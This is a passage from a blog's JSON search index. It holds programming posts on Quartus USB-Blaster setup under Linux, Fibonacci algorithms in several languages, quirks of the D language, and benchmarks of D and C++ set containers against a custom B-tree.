machine.   Make sure jtagd has access to the list of devices:   $ sudo mkdir /etc/jtagd $ sudo cp $QUARTUS_ROOTDIR_OVERRIDE/linux64/pgm_parts.txt /etc/jtagd/jtagd.pgm_parts   Also make sure this file has read access for the user.   The cable should now be recognized as a valid hardware by the Quartus tools. From Quartus, select Tools, Programmer, Hardware Setup… and then select the board from the drop-down list. Now, the Programmer, JTAG Chain Debugger and System console should all recognize and use the USB-Blaster device.  ","categories": ["tutorial"],
        "tags": ["linux"],
        "url": "/tutorial/quartus-linux/",
        "teaser": "/assets/images/s4pu.png"
      },{
        "title": "Fibonacci numbers: from zero to hero",
        "excerpt":"Fibonacci numbers appear unexpectedly often in Mathematics and in Computer Science. They are related to the golden ratio and just like the magical number, have a very extensive Wikipedia entry. The Fibonacci sequence is defined by a recurrence relation and is used as a canonical example of recursion in introductory programming and/or discrete math courses for computer science. This means that pretty much every programmer has implemented an algorithm to find Fibonacci numbers. Here we explore some possible approaches.   For a TLDR, jump to the bottom of the page.   A golden sequence   The Fibonacci numbers can be defined as   \\(F_0 = 0, F_1 = 1\\) and   \\(F_n = F_{n-1} + F_{n-2}\\) for \\(n &gt; 1\\)   Most programmers think of a function when reading the previous definition, where the subscript number is its single argument. Others see it as some data structure being indexed; this idea will be useful later. The naive approach then translates math directly into some programming language, for instance C.   int fib(int n) { \tif (n == 0) return 0; \telse if (n == 1) return 1; \telse return fib(n - 1) + fib(n - 2); }   That definition has some obvious practical issues. For any negative input, the procedure launches into an infinite loop and eventually crashes the program. Secondly, it is extremely inefficient: on my machine it takes around 15 seconds to compute and print fib(47) (gcc 9.2.0 with -O3). At last, we will quickly run into undefined behaviour as we overflow through the limits of our signed integer representation. In fact, with 32-bit signed ints we can only correctly calculate the sequence for values of n from zero to 46. That limit goes up to 93 when using longer 64-bit numbers and making them unsigned allows us to find a single extra number of the sequence.   There are two easy ways to remove the danger of an infinite loop: we can assert against negative values and crash the program (or throw an exception) intentionally or we can change the conditional to avoid the loop and return a technically incorrect result. Another option is to extend the sequence for negative integers, this shall be done latter on. We also solve the numeric representation issue by using a programming language which supports arbitrary-precision arithmetic (aka bignums) by default, so let’s goto Python.   def fib(n):     if n &lt;= 1:         return n;     else:         return fib(n - 1) + fib(n - 2)   While we could theoretically compute bigger Fibonacci numbers now, it would take ages to do so using this implementation. While Python made the performance worse by a factor of ~50x in relation to C, the problem is the underlying algorithm being used. By substituting each call to fib by the subsequent multiple-recursive calls it generates, we find out that there is lots of redundant computation being done.                            fib(4)              fib(3)        +        fib(2)      fib(2)     +  fib(1)       fib(1) + fib(0) fib(1) + fib(0)   Notice that an invocation of fib(n) reaches the base cases (fib(0) and fib(1)) \\(F_{n+1}\\) times. In fact, let \\(C_n\\) be the number of calls executed when computing fib(n), then for all \\(n &gt; 1\\)   \\[C_n = 1 + C_{n-1} + C_{n-2}\\]  Meanwhile, for the base cases we have   \\[C_0 + 1 = 2 = 2 F_1\\\\ C_1 + 1 = 2 = 2 F_2\\]  So we can try to conjecture that   \\[C_n + 1 = 2 F_{n+1}\\]  Supposing that holds for \\(C_{n-1}\\) and \\(C_{n-2}\\) the proof goes as follows:   \\[C_n = 1 + C_{n-1} + C_{n-2}\\\\ C_n + 1 = (C_{n-1} + 1) + (C_{n-2} + 1)\\\\ C_n + 1 = 2 F_n + 2 F_{n-1}\\\\ C_n + 1 = 2 (F_n + F_{n-1})\\\\ C_n + 1 = 2 F_{n+1}\\\\\\]  Thus we have proved that for all \\(n \\ge 0\\)   \\[C_n = 2 F_{n+1} - 1\\]  With this we have proved that the naive implementation presented earlier has exponential time complexity (the Fibonacci sequence grows exponentially), more specifically \\(\\Theta(\\phi^{n})\\), where \\(\\phi\\) is the golden ratio. The previous theorem is also the sole reason this binary-recursive procedure is useful in benchmarks, as we may easily calculate the exact number of function calls performed and find the average invocation time.   Going down the rabbit hole   Looking back upon the recurrence relation \\(F_k = F_{k-1} + F_{k-2}\\) one may intuitively deduce that it should be possible to compute \\(F_{k+n}\\) in linear time if values of \\(F_{k+n-1}\\) and \\(F_{k+n-2}\\) are known. For instance when \\(n=0\\) only a single addition is needed; for \\(n=1\\) we need two: the first to compute \\(F_{k}\\) and another to find \\(F_{k+1}\\); and so son. The most common “efficient” procedure to compute Fibonacci numbers leverages this notion in order to reach \\(\\Theta(n)\\) time complexity and looks something like this:   def fib(n):     previous = 1     current = 0     for _ in range(n):         previous, current = current, previous + current     return current   A Python program that simply prints the result of fib(47) now takes about 0.04 seconds to complete on my machine (CPython v3.8.1). In fact, that time is mostly the Python environment starting up and it is approximately the same when computing the 10,000th Fibonacci number. We can even turn this function into a generator so as to compute Fibonacci numbers on demand as we iterate through them.   def fibs(n):     previous = 1     current = 0     for _ in range(n):         yield current         previous, current = current, previous + current  # printing the first 100 numbers of the sequence for n, fn in enumerate(fibs(100)):     print(\"fib(%d) = %d\" % (n, fn))   Although the loop-based version is definitely more efficient than the previous one, its implementation is not as obvious and does not resemble the sequence’s mathematical definition. Perhaps we can improve this by sending previous and current as additional arguments to a recursive procedure:   def fib(n, previous = 1, current = 0):     if n &lt;= 0:         return current     else:         return fib(n - 1, current, previous + current)   While performance remains mostly the same and the procedure is a tad more versatile (by setting previous and current to another pair of consecutive Fibonacci numbers we can now compute the sequence from any starting point, as if with a different “seed”), calling this new routine with somewhat bigger values of n yields a crash with the message RecursionError: maximum recursion depth exceeded ....   This happens because Python does not optimize tail calls, so each iteration takes some space in the call stack, eventually reaching its limit. In fact, our procedure now has a space complexity of \\(\\Theta(n)\\) while the loop version was just \\(\\Theta(1)\\). Most functional languages support proper tail recursion, but before we go there let’s see how C++ fares in this case (since C doesn’t have default argument values without macros).   constexpr int fib(int n, int prev = 1, int curr = 0) { \tif (n &lt;= 0) \t\treturn curr; \telse [[likely]] \t\treturn fib(n - 1, curr, prev + curr); }   Modern compilers are able to recognize this pattern and perform Tail Call Optimization (TCO), so the procedure above is made equivalent to the constant-space for loop implementation. Making the function constexpr also signals to the compiler that it should try to optimize calls for values known at compile time. For instance, a main function that simply returns fib(40) gets compiled into   main:         mov     eax, 102334155         ret   Since we wish for proper tail recursion as well as infinite-precision arithmetic, I choose Scheme as our next programming language. In the example below, iterate is a tail-recursive function defined inside the body of fib that performs the computation in constant space and linear time.   (define (fib n)   (let iterate ((n n) (previous 1) (current 0))     (if (&lt;= n 0) current         (iterate (- n 1) current (+ previous current)))))   FFT: the Fast Fibonacci Transform   One may realize that each call to iterate is basically a transformation applied to the last two parameters while n is simply a countdown controling how many times this is repeated. This can be represented as follows:   \\[T(c, p) = (c + p, c)\\]  If \\(p\\) and \\(c\\) are consecutive Fibonacci numbers, we can say that   \\[T(F_k, F_{k-1}) = (F_k + F_{k-1}, F_k) = (F_{k+1}, F_k)\\]  and thus   \\[T^n(F_k, F_{k-1}) = (F_{k+n}, F_{k+n-1})\\]  \\(T\\) happens to be a linear transformation (proving that property is left as an exercise to the reader). Its transformation matrix, sometimes called the Fibonacci matrix, is easily found:   \\[A \\begin{bmatrix}c \\\\ p\\end{bmatrix} = \\begin{bmatrix}c + p \\\\ c\\end{bmatrix}\\\\ A = \\begin{bmatrix}A \\begin{bmatrix}1\\\\0\\end{bmatrix} &amp; A\\begin{bmatrix}0\\\\1\\end{bmatrix}\\end{bmatrix}\\\\ A = \\begin{bmatrix}1 &amp; 1\\\\ 1 &amp; 0\\end{bmatrix}\\]  After that, we can accomplish transformation composition through matrix multiplication, in other words:   \\[A^n \\begin{bmatrix}0 \\\\ 1\\end{bmatrix} = \\begin{bmatrix}F_n \\\\ F_{n-1}\\end{bmatrix}\\]  At this point we have found a method to compute Fibonacci numbers through matrix exponentiation, and since the latter can be achieved – through a Successive Squaring algorithm – in \\(\\Theta(\\log_2 n)\\) time, so can the former. The Octave code below does exactly that.   function F_n = fib(n)  \tA = [1, 1; \t     1, 0];  \tx = [0; \t     1];  \ty = A^n * x;  \tF_n = y(1);  endfunction   If you are into linear algebra, you may remember that there is a special basis in which a linear transformation can be represented as a diagonal matrix. This makes it a little bit easier to perform matrix exponentiation: simply raise each diagonal element to the desired power and then go back to the canonical basis to find the end result. Using all this eigen-stuff leads us to Binet’s formula, the closed-form solution for Fibonacci numbers:   \\[F_n = {(\\phi^n - \\psi^n) \\over (\\phi - \\psi)} = {(\\phi^n - \\psi^n) \\over \\sqrt{5}}\\]  where \\(\\phi\\) is the golden ratio and \\(\\psi\\) its complement (these are the eigenvalues for the Fibonacci transform).   So theoretically we could use that in our implementation:   from math import sqrt  PHI = (1 + sqrt(5)) / 2  # golden ratio number PSI = 1 - PHI            # and its complement  def fib(n):     return round((PHI**n - PSI**n) / sqrt(5))   However, for big values of n we still get an OverflowError: (..., 'Numerical result out of range'); in some languages instead of throwing an exception the program would return its representation of infinity. This happens because now we’re dealing with floating-point numbers, which are not big enough for our desired range of values.   Going back to the Fibonacci matrix, we can assume that for some \\(k\\) (notice that it is true when \\(k=1\\))   \\[\\begin{bmatrix}1 &amp; 1\\\\ 1 &amp; 0\\end{bmatrix}^k = \\begin{bmatrix}F_{k+1} &amp; F_k\\\\ F_k &amp; F_{k-1}\\end{bmatrix}\\]  then   \\[\\begin{bmatrix}1 &amp; 1\\\\ 1 &amp; 0\\end{bmatrix}^k \\begin{bmatrix}1 &amp; 1\\\\ 1 &amp; 0\\end{bmatrix} = \\begin{bmatrix}F_{k+1} &amp; F_k\\\\ F_k &amp; F_{k-1}\\end{bmatrix} \\begin{bmatrix}1 &amp; 1\\\\ 1 &amp; 0\\end{bmatrix}\\\\ \\begin{bmatrix}1 &amp; 1\\\\ 1 &amp; 0\\end{bmatrix}^{k+1} = \\begin{bmatrix}F_{k+1} + F_k &amp; F_k + F_{k-1}\\\\ F_{k+1} &amp; F_k\\end{bmatrix}\\\\ \\begin{bmatrix}1 &amp; 1\\\\ 1 &amp; 0\\end{bmatrix}^{k+1} = \\begin{bmatrix}F_{k+2} &amp; F_{k+1}\\\\ F_{k+1} &amp; F_k\\end{bmatrix}\\]  this means for all \\(n \\ge 1\\)   \\[\\begin{bmatrix}1 &amp; 1\\\\ 1 &amp; 0\\end{bmatrix}^n = \\begin{bmatrix}F_{n+1} &amp; F_n\\\\ F_n &amp; F_{n-1}\\end{bmatrix}\\]  At this point, we can square both sides:   \\[\\begin{bmatrix}1 &amp; 1\\\\ 1 &amp; 0\\end{bmatrix}^n \\begin{bmatrix}1 &amp; 1\\\\ 1 &amp; 0\\end{bmatrix}^n = \\begin{bmatrix}F_{n+1} &amp; F_n\\\\ F_n &amp; F_{n-1}\\end{bmatrix} \\begin{bmatrix}F_{n+1} &amp; F_n\\\\ F_n &amp; F_{n-1}\\end{bmatrix}\\\\ \\begin{bmatrix}1 &amp; 1\\\\ 1 &amp; 0\\end{bmatrix}^{2n} = \\begin{bmatrix}F_{n+1}^{2} + F_n^2 &amp; F_n (F_{n+1} + F_{n-1})\\\\ F_n (F_{n+1} + F_{n-1}) &amp; F_n^2 + F_{n-1}^{2}\\end{bmatrix}\\]  And since the general rule still applies, we have   \\[F_{2n} = F_n (F_{n+1} + F_{n-1}) = F_n (F_{n+1} + F_{n+1} - F_n) = F_n (2F_{n+1} - F_n)\\\\ F_{2n+1} = F_{n+1}^{2} + F_n^2\\]  This means we can compute Fibonacci numbers through a successive squaring method, thus achieving \\(\\Theta(\\log_2 n)\\) bigint arithmetic operations. Evidently, this method has the same asymptotic time complexity as exponentating the Fibonacci matrix, but it may save a few operations. The fast recursive procedure is given below in Haskell. In case you’ve noticed, space complexity – the call stack – has risen from constant to \\(\\Theta(\\log_2 n)\\), but since logarithmic growth is so slow, most of the time there is no need to worry about stack overflows.   fib_ :: Int -&gt; (Integer, Integer) fib_ 0 = (0, 1) fib_ n = let (fk, fk1) = fib_ (div n 2)              fn        = fk * (2*fk1 - fk)              fn1       = fk1^2 + fk^2          in if mod n 2 == 0             then (fn, fn1)             else (fn1, fn + fn1)  fib :: Int -&gt; Integer fib n = fn where (fn, _) = fib_ n   Another way to see this is to think of the previously mentioned transformation \\(T\\) as a special case of \\(T_{pq}(a, b) = (a (q + p) + bq, aq + bp)\\) when \\(p = 0, q = 1\\). It is then always possible to find \\(p', q'\\) such that \\(T_{p'q'} = T_{pq}^2\\): just let \\(p' = q^2 + p^2\\) and \\(q' = q^2 + 2qp\\). Let n be the number of transformations that need to be applied. Then for each step, if n is odd we simply apply the transformation and go to the next iteration; otherwise n is even and we change p and q such that only half the number of transformations is now needed. This is an exercise in Abelson &amp; Sussman’s classic, Structure and Interpretation of Computer Programs (a.k.a. “The Wizard Book”).   (define (fib n)   (let iter ([p 0] [q 1] [n n] [a 1] [b 0])     (cond [(&lt;= n 0) b]           [(even? n)            (iter (+ (* q q) (* p p))                  (+ (* q q) (* 2 p q))                  (/ n 2) a b)]           [else            (iter p q (- n 1)                  (+ (* a (+ q p)) (* b q))                  (+ (* a q) (* b p)))])))   Memoization and Streams   Another common way to obtain Fibonacci numbers is to pre-compute them such that each input n maps to a memory location where \\(F_n\\) is stored. \\(F_n\\) can thus be thought of as a vector being indexed at its nth position.   fibs_ = [fn for fn in fibs(1000)] # fibs is the generator  def memo_fib(n):     if n &lt; len(fibs_):         return fibs_[n]     else:         curr, prev = fibs_[-1], fibs_[-2]         for _ in range(n - len(fibs_) + 1):             prev, curr = curr, curr + prev             fibs_.append(curr)         return curr   The Python code above allocates a chunk of memory and fills it sequentially with the Fibonacci sequence such that later accesses need no computation and could, theoretically, be made in \\(\\Theta(1)\\) time. When the number is too far down the sequence and hasn’t been calculated yet, we start with the closest pair of Fibonacci numbers and continue to fill the vector until the desired number is reached.   This approach may end up taking too much space, so there’s still some optimization to be done. Another issue is that memory is updated dynamically, requiring eventual reallocations and other such expensive operations.   Using a language with better support for lambdas and first-class functions, we could turn this memoization / tabling technique into something a little more generic. In this case we use Guile’s hash-tables to map a procedure’s argument list to its cached results.   ;; make a function that caches its past results (define (memoize proc)   (let ((cache (make-table)))     (define (delegate . args)       (let ((hit (lookup cache args)))         (or hit             (let ((result (apply proc args)))               (insert! cache args result)               result))))     delegate))  ;; GUILE specific (define make-table make-hash-table) (define lookup hash-ref) (define insert! hash-set!)  ;; example (define memo-fib   (memoize     (lambda (n)       (if (&lt;= n 1) n           (+ (memo-fib (- n 1)) (memo-fib (- n 2)))))))   This memoization process can be thought of as a data structure which contains past results and generates new ones on demand. The same thing happens with lazy lists, which are potentially infinite data structures also known as streams. Haskell, being a lazy programming language, has this behaviour by default:   fibs :: Integer -&gt; Integer -&gt; [Integer] fibs prev curr = prev : fibs curr (prev + curr)  main = do     let fib = fibs 0 1 -- fib contains the entire sequence     print (fib !! 47)  -- Fn = fib !! n   The snippet above shows a possibly infinite list named fib which contains the whole Fibonacci sequence. It is returned by the function fibs in constant time and each indexing operation on it sequentially computes Fibonacci numbers while storing past results in the beggining of the list.   Negafibonacci   All of the techniques and algorithms shown so far consider the Fibonacci sequence to be indexed by natural numbers. Most implementations seen in the wild also make this assumption, sometimes throwing an error when negative integers are used, others just blatantly ignoring these inputs.   The sequence can be easily extended with the “Negafibonacci” numbers by following   \\[F_n = F_{n-1} + F_{n-2}\\\\ F_{n-2} = F_n - F_{n-1}\\]  which leads us to   \\[F_{-1} = F_{1} - F_{0} = 1 - 0 = 1\\\\ F_{-2} = F_{0} - F_{-1} = 0 - 1 = -1\\\\ F_{-3} = ... = 2\\\\ F_{-4} = -3\\\\ F_{-5} = 5\\\\ ...\\]  It is then easy to notice that whenever \\(n &lt; 0\\)   \\(F(n) = F(-n)\\) if \\(n\\) is odd, and   \\(F(n) = -F(-n)\\) if \\(n\\) is instead even.   Some may be tempted to write this in the mathematically equivalent form   \\[F(n &lt; 0) = (-1)^{n-1} F(-n)\\]  but I personally discourage doing this in actual code as it makes it much less evident what the property is and may lead to an expensive exponentiation process just to get the right sign when compared to a simple conditional:   fn = fib(abs(n)) if n &lt; 0 and n % 2 == 0:     return -fn else:     return fn   TL;DR   If you came here to see a code snippet with a final, optimal algorithm for Fibonacci numbers, then I’m sorry to disappoint you. Instead, the conclusion of this overly long post is that there will always be many ways to compute something, each with its own tradeoffs.   In the end, though, I can say that:      Unless you’re benchmarking something, forget about the double-recursive procedure.   The sequence grows exponentially, so bignums are a must.   When Fibonacci numbers are only required sparsely, use some form of the fast transform to guarantee \\(\\Theta(\\log_2 n)\\) time and \\(\\Theta(1)\\) space complexity.   A generator is a very clean way to iterate through Fibonacci numbers sequentially.   If the whole sequence – or perhaps some slice of it – is needed, streams are the way to go.   Dynamic memoization and/or static tabling is the approach people usually suggest to optimize Fibonacci numbers, but the memory overhead is hardly ever worth it: consider using the fast transform instead. Of course, if a value can be statically optimized (during compilation, for instance, with C++’s constexpr), then this is usually preferred.   Translating math directly into code usually turns out terribly inefficient (see the double-recursive procedure), but using it smartly gives you very useful properties (see the FFT).   Knowing different programming languages gives insight into useful techniques you wouldn’t normally consider.  ","categories": ["tutorial"],
        "tags": ["algorithms"],
        "url": "/tutorial/fibonacci/",
        "teaser": "/assets/images/wizard.png"
      },{
        "title": "Dlang Woes",
        "excerpt":"   woe (noun)         great sorrow or distress (often used hyperbolically).      There’s a quote by Bjarne Stroustrup saying that “there are only two kinds of languages: the ones people complain about and the ones nobody uses”. Complaining is therefore a natural result of using a language, and I’ve been using D a bit more in my latest side projects.   While there’s a lot of great things to be said about this language and its tooling (especially when compared to C, C++ and other contenders), there are also some warts here and there. So, here’s some complaining, either pointing out bugs or simply violations of the principle of least astonishment (POLA) in the language (in my opinion, that is).   struct this vs class this   Q: Can you pass this by ref?   A1: Only inside structs, not classes.   A2: Actually, you can assign this to a variable, then pass that variable by ref.   A3: Consider passing by auto ref instead, or maybe in if the argument is also const.   // struct.this vs class.this // or, pass this by ref  int bar(T)(ref T x) { return 1; }  class C {     int foo() { return this.bar; } // &lt;--- error }  struct S {     int foo() { return this.bar; } // &lt;--- but this works? }  void main() {     auto c = new C();     c.bar; // &lt;--- also works }  // Error: none of the overloads of template `onlineapp.bar` are callable using argument types `!()(C)` // Candidate is: `bar(T)(ref T x)`   UFCS vs Method Overloading   Q: Does Universal Function Call Syntax (UFCS) turn variable.foo(arguments) into foo(variable, arguments) ?   A1: Yeah! Cool, huh?   A2: Actually, UFCS only applies to functions in module scope (lambdas or local ones don’t count).   A3: They also don’t work in the presence of methods called foo (never mind the full typed signature).   // UFCS vs Method Overloading  int foo(T)(ref T x, float f){ return 1; }  struct A {}  struct B {     int foo(bool b) { return 2; } }  void main() {     import std.stdio : writeln;      A a;     writeln(\"A * bool  -&gt; \", a.foo(true));     writeln(\"A * float -&gt; \", a.foo(1.23)); // &lt;--- ok, uses UFCS      B b;     writeln(\"B * bool -&gt; \", b.foo(true));     writeln(\"B * float -&gt; \", b.foo(1.23)); // &lt;--- error (ignores UFCS?)     writeln(\"B * float (without UFCS) -&gt; \", foo(b, 1.23)); // &lt;--- ok }  // Error: function `B.foo(bool b)` is not callable using argument types `(double)` // cannot pass argument `1.23` of type `double` to parameter `bool b`   taggedPointer vs @safe   Q: Are std.bitmanip.taggedPointers safe?   A1: Yes they’re safe: they only use pointer bits which are known (at compile time!) to be zero due to alignment constraints.   A2: But they’re not scope @safe though. Here’s the bug report.   A3: Also, they don’t work in CTFE because pointer casts are not allowed there.   // taggedPointer accessors are not scope // Compile with: -dip1000 -main // Bugzilla #3095, reported in 2022-05-05  import std.bitmanip : taggedPointer;  struct S {     mixin(taggedPointer!(         int*, \"ptr\",         bool, \"flag\", 1     )); }  void foo(scope ref S s) @safe {     s.flag; // &lt;--- error }  // Error: scope variable `s` assigned to non-scope parameter `this` calling `flag`  ","categories": ["rant"],
        "tags": ["programming-languages"],
        "url": "/rant/d-woes/",
        "teaser": "/assets/images/aigen-nightcafe-woe.png"
      },{
        "title": "On the performance of D sets",
        "excerpt":"If I google “dlang sets”, the first result is this forum post, “How to use sets in D?”. The main alternatives, brought up in the replies, consist of using std.container.rbtree or making a custom wrapper around the built-in associative arrays (AAs). I’ll explore and compare the performance of those options, then try to come up with something better and, more importantly, something that works in DasBetterC mode.   Experimental Setup   I’ve written four small parameterized benchmarks, one for each relevant operation on a mutable set data type:      upsert: creates an empty set container and upserts \\(n\\) random elements (of a given element type), measuring elapsed CPU time of all \\(n\\) insertions.   lookupFind: inserts \\(n\\) random elements, then looks up these same elements in the set (checking that they were found), while measuring only the lookups.   lookupFail: inserts \\(2n\\) random elements, removes the first \\(n\\), then looks them up (checking that they were NOT found).   remove: inserts \\(n\\) random elements, then removes them one by one, measuring only removals.   In each of these, we measure elapsed CPU time (using clock) of performing all \\(n\\) operations. Then, we repeat that 30 times in order to eliminate some measurement noise. All elements are randomized once (using rand), in the very beginning of the test, with a fixed random seed, and the D garbage collector (GC) is executed before each of those repetitions. Finally, we vary \\(n\\) across powers of two, \\(2^{4} \\le n \\le 2^{20}\\).   Since the payload does not change while repeating each experiment, we estimate performance using Chen and Revel’s model: if \\(measuredTime = realTime + randomDelay\\), and \\(randomDelay\\) is always non-negative (the system can become slower at times due to other processes running, but not randomly faster), then the minimum value we can obtain of \\(measureTime\\) should be the best estimate of \\(realTime\\). Once we have the estimate of how long it takes to perform an operation \\(n\\) times, we’ll report that time normalized by the number of repetitions, that is, \\(estimateTime(n) \\div n\\).   AAs and std.container.rbtree both lack support for custom allocators, which makes it really hard to precisely measure their memory usage. I’m aware of core.memory.GC, but it didn’t work as expected when I tried it and it could never be as precise as a custom allocator anyhow. Since I’m lazy, I chose to use GNU time’s report of resident set size (RSS) as a single way to measure memory usage across D, C and C++ programs.   GNU time can be used to report the maximum RSS of a program, and in each experiment that should correspond to the point in lookupFail after inserting \\(2n\\) elements. Then, we could get a (very rough) estimate of memory usage per element by dividing that value by the number of elements in each set. It should be noted, however, that these \\(2n\\) elements were generated at random and are being deduplicated by the set, so the birthday problem applies more and more as \\(n\\) grows. Therefore, we also need to record the maximum number of elements stored in the set during a program run. We also note that, for small \\(n\\), we expect max RSS to be incredibly imprecise, since most of it is being used by the language runtime.   For the sake of completeness, here’s more information about the system these micro-benchmarks ran on:  CPU: Intel i7-6700HQ (8) @ 3.500GHz Caches (L1d, L1i, L2, L3): 128 KiB, 128 KiB, 1 MiB, 6 MiB Memory: 16 GiB OS: Pop!_OS 22.04 LTS x86_64 Kernel: Linux 6.2.6-76060206-generic D compiler: ldc2 1.32.2 D flags: -O -release -inline -boundscheck=off C++ compiler: g++ (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0 C++ flags: -std=c++17 -O3 time: time (GNU Time) UNKNOWN Shell: bash 5.1.16   And here’s a table with raw experimental results.   AA-as-set vs std.container.rbtree   If we limit ourselves to the D runtime and standard library, we’ll be comparing hash-tables (AAs) and red-black trees (std.container.rbtree). Since our inputs follow a uniform distribution, their hashes ought to be uniformly distributed as well, which is pretty much the ideal situation for hash tables. Therefore, I expect the AA-based set to have much faster (average \\(\\mathcal{O}(1)\\)) lookups than the tree-based set (\\(\\Theta(log_2 n)\\)), and for lookup time to dominate other operations as well.       The two graphs above show results for lookupFind and lookupFail, respectively, using integer elements. As predicted, AAs exhibit near-constant time complexity. Meanwhile, lookups on the tree-based set become logarithmically slower as \\(n\\) increases – it only looks linear in our graphs because of the logarithmic scale on the horizontal axis.   The graph of our tree-based set looks like two connected lines, with the second having a larger slope. I’m guessing this happens because, after a certain point, we’re hitting the next level of the memory hierarchy much more frequently. Why do I think this? Well, my CPU’s L1d, L2 and L3 sizes are 128 KiB, 1 MiB and 6 MiB, respectively. Therefore, if we were to completely fill my L2 cache with 4-byte integers, it would fit at most \\(262,144\\) elements. Since our data structures are never as memory-efficient as a giant array with contiguous elements, we start hitting L3 a little earlier than \\(n = 262,144\\), and we see that that’s approximately where the slope changes.   I won’t bother showing graphs for the other operations, since their shapes are pretty much the same. In fact, I’m only showing both lookupFind and lookupFail (and in the same vertical scale) to note that the difference between a successful and a non-successful lookup is much more significant in a tree-based set (find is 1.56x faster than fail at \\(n = 2^{20}\\)) than in a hash-based set (resp. 1.18x). Here’s a table summarizing the relative perfomance of these sets at a few input sizes:                  Operation       AA speedup at \\(n = 2^{7}\\)       \\(n = 2^{10}\\)       \\(n = 2^{20}\\)                       upsert       0.92x       1.74x        3.53x                 lookupFind       1.50x       5.00x       10.17x                 lookupFail       2.50x       3.94x       13.43x                 remove       1.67x       4.60x       11.60x           It’s pretty clear that using AAs instead of std.container.rbtree should be preferred whenever you don’t need in-order iteration over set elements, as the performance gains range from pretty small to an order of magnitude (on most operations). That is, of course, if you can get a uniform distribution of hashes.   For memory results, see the next section.   D vs C++   Some people consider D to be a successor to C++, so I’m also interested in comparing the set data structures in each language’s standard libraries. So, after some messing around with C++’s terrible templates and macros, I’ve ported our micro-benchmark program in order to add std::set and std::unordered_set to our comparison.   Before running anything, my expectations were that performance differences would come mainly from the different allocation strategies: garbage collection in D versus manual (de)allocations in C++. In particular, I expected D sets to have slightly faster removals due to the GC-deferred deallocations. I would normally expect allocations to be faster in C++ on average, but because the D GC is being executed before each round of operations, it shouldn’t affect upserts that much. I also expected memory usage to be higher in D, mainly due to its heavier runtime.   Since tree-based and hash-based sets have quite a big performance gap in these benchmarks, we’ll separate these two groups. With that said, let’s start with the tree-based containers, std.container.rbtree and std::set (charts below). Both have very similar performance (which is to be expected, since they’re both red-black trees), but the D version is usually a bit faster at larger \\(n\\). I was a bit surprised by the performance of upserts, which are faster in the C++ version for sets with less than a hundred thousand elements. This might be related to the performance of memory allocation with the D GC, as opposed to C++’s new.         Our hash-based set comparison went similarly, with the D version being slightly faster on lookups, but slightly slower on insertions. There was a bigger difference in removal performance in this group, with D AAs being consistently faster than std::unordered_set. Removal speedups range from ~1.5x, up to 4.25x for bigger sets. Once again, this might be explained by the different deallocation strategies; after all, D memory is only actually being deallocated during GC cycles, which either happen on insertions, or before the next experiment repetition (a manually-triggered full GC cycle which is not measured).         As for memory usage, here’s how our sets compare (graph below, but note the logarithmic scale on the vertical axis this time). Once again, we’re normalizing our estimate of memory usage by the number of elements in each set. As expected of our chosen memory metric (maximum process RSS), this leads to a huge overstatement of how much each element actually takes, at least for small \\(n\\). Therefore, this measurement is better interpreted as “what is the maximum amount of bytes each element could be taking, assuming nothing else in the entire program contributed to RSS”. For larger \\(n\\), however, I expect this estimate to tend towards the real per-element memory usage.     Assuming the measure for our largest \\(n\\) is the better estimate, we end up with the following:                  container       max RSS per element (bytes)                       AA-as-set       2759 B                 std.container.rbtree       2371 B                 std::set       51 B                 std::unordered_set       46 B                 eris.btree       12 B           While final values for the C++ containers seem reasonable, that’s far from true for the D sets. I expected D’s heavier runtime to inflate memory usage measurements, and we can see that in the left part of the graph as a roughly constant offset between the logarithmic curves of D and C++ containers. As we increased \\(n\\), the C++ programs started to converge towards something close to the true memory usage per element, but the D ones kept to a maximum RSS two orders of magnitude higher. Remember that max RSS stands for the greatest amount of physical memory the process occupied during its entire execution. Since both AAs and std.container.rbtree make heavy use of the GC, I assume that is what’s keeping the RSS high; perhaps it keeps freed memory around in order to reuse it later, instead of giving it back to the operating system.   Something you might notice in the last chart is that it includes memory usage for another set container, eris.btree. That’s my custom B-tree, which is implemented in D, but uses a custom allocator (based on malloc and free) instead of the D GC. We can see that, despite being implemented in D (and being run with the same heavier runtime), this data structure has similar behaviour to the C++ ones with respect to our measure of memory usage, beating them by approximately 4x at \\(n = 2^{20}\\). This also strenghtens the argument that the huge max RSS per element, obtained when benchmarking the D containers, is due to their usage of the GC and probably not even close to true memory usage (if only they supported custom allocators …).   The next section compares my custom eris.btree container with the other sets we’ve seen so far.   B-Tree Container   While D’s standard set containers have roughly equivalent (often slightly better) performance compared to their C++ counterparts, it turns out that C++ standard set containers are not actually that good to begin with. From what I could gather, these standard containers can’t be the fastest possible data types due to requirements of reference and iterator stability across mutating operations on the containers, as well as a few requirements related to const-correctness. This means that std::set (like std::map) pretty much has to be implemented with a binary tree (a red-black tree, to be more precise), and that std::unordered_set (like std::unordered_map) can’t use closed hashing (i.e. their hash table implementation has to use separate chaining). All of these restrictions lead to worse performance, mainly through less-than-optimal cache usage.   As far as I know, relational databases rely on B+ and B-trees because these data structures provide increased data locality on each node and, due to a fan-out that’s much higher than a binary tree, less pointer chasing when going down the tree. While these factors are especially relevant for data structures using hard disks as their underlying storage, they also apply to in-memory data strucutres. Therefore, I figured that a simple B-tree-based set would provide a good contestant against D and C++ standard containers. Let’s check the results:           As we can see, for \\(2^{14} \\le n \\le 2^{20}\\), the performance of our B-tree is closer to hash-based sets than tree-based ones. B-tree operations have a theoretical time complexity of \\(\\Theta(log_m n)\\), for some constant \\(m \\gt 2\\); as \\(m\\) (the order of the B-tree) increases, this becomes “effectively \\(\\mathcal{O}(1)\\)” for any real-world \\(n\\), which is precisely what we’re observing in these results. If you prefer relative speedups, here’s how our B-tree compares to other sets at \\(n = 2^{20}\\):                  container / operation       upsert       lookupFind       lookupFail       remove                       AA-as-set       1.09x       0.40x       0.32x       0.35x                 std::set       4.31x       7.27x       4.70x       5.93x                 std::unordered_set       2.02x       0.58x       0.42x       1.50x                 std.container.rbtree       3.86x       4.02x       4.29x       4.10x           Looking at just the tree-based containers, we can see speedups of approximately 4x (and up to ~7x) across the board by using our custom B-tree-based set. In most cases, we still fall behind the hash-based containers, albeit by less than the order-of-magnitude margin they had over the red-black trees. The exception here is upsert, where the B-tree gets a little faster than the hash tables. As for memory, we covered that in the previous section already.   A B-tree’s main disadvantage is the fact that mutating operations may need to move multiple elements around in memory. This invalidates iterators and references to internally-held elements, but may also decrease performance for bigger elements.   Bigger Elements   A big part of “modern C++” is copy elision and move semantics. These features are supposed to interact nicely with RAII, and improve performance by avoiding unnecessary copies. While D also has some features to avoid copies, there’s definitely much less of a focus in that. Therefore, it should be interesting to compare our sets with bigger element types. In our case, 